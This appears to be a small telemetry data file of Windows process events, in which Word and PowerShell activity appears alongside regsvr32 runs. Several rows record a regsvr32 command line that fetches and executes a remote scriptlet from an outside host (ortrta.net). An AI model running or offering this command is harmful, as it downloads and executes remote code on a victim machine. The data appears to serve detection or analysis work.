ef62cc8e-9e1b-89b4-949d-58c9cf25afcc,{'subject': 'c:\\windows\\system32\\regsvr32.exe None'},580177
ef62cc8e-9e1b-89b4-949d-58c9cf25afcc,{'subject': 'c:\\windows\\system32\\regsvr32.exe None'},580177
613f6df7-5694-84c5-a6d2-6eaf7362dc6e,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},580127
ef62cc8e-9e1b-89b4-949d-58c9cf25afcc,{'subject': 'c:\\windows\\system32\\regsvr32.exe None'},580177
96ebdaf7-4479-89a1-a085-f55c8d6efcf0,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},580101
e7863f61-68b8-8b8b-b00a-2ace463f6b0a,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll'},580533
872720a9-f79b-86f9-ba05-8f4c412a1c02,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll'},580541
ecb5ab49-fc3a-8354-be29-f2cd651b879e,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},580539
ecb5ab49-fc3a-8354-be29-f2cd651b879e,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},580539
ef62cc8e-9e1b-89b4-949d-58c9cf25afcc,{'subject': 'c:\\windows\\system32\\regsvr32.exe None'},580177
e7863f61-68b8-8b8b-b00a-2ace463f6b0a,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll'},580533
872720a9-f79b-86f9-ba05-8f4c412a1c02,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll'},580541
e7863f61-68b8-8b8b-b00a-2ace463f6b0a,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll'},580533
872720a9-f79b-86f9-ba05-8f4c412a1c02,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll'},580541
ecb5ab49-fc3a-8354-be29-f2cd651b879e,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},580539
ecb5ab49-fc3a-8354-be29-f2cd651b879e,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},580539
